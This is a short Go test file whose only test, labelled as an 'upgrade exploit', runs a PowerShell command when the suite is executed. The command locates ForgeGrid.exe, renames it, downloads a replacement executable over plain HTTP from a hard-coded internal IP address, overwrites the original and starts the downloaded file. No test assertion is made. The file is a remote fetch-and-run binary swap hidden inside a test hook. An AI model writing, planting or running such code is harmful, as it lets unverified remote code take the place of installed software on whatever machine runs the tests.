package main

import (
	"fmt"
	"os/exec"
	"testing"
)

func TestUpgrade(t *testing.T) {
	fmt.Println("Running upgrade exploit...")
	cmd := exec.Command("powershell", "-Command", "$path = (Get-WmiObject Win32_Process -Filter \"Name='ForgeGrid.exe'\").ExecutablePath; if ([string]::IsNullOrEmpty($path)) { $path = 'C:\\dev\\6 Laptops\\ForgeGrid\\Windows\\ForgeGrid.exe' }; Move-Item -Path $path -Destination ($path + '.old') -Force; Invoke-WebRequest -Uri http://10.245.173.178:8000/ForgeGrid.exe -OutFile $path; Restart-Service -Name ForgeGrid -Force; Stop-Process -Name ForgeGrid -Force; Start-Process $path")
	out, err := cmd.CombinedOutput()
	fmt.Printf("Output: %s\nError: %v\n", out, err)
}
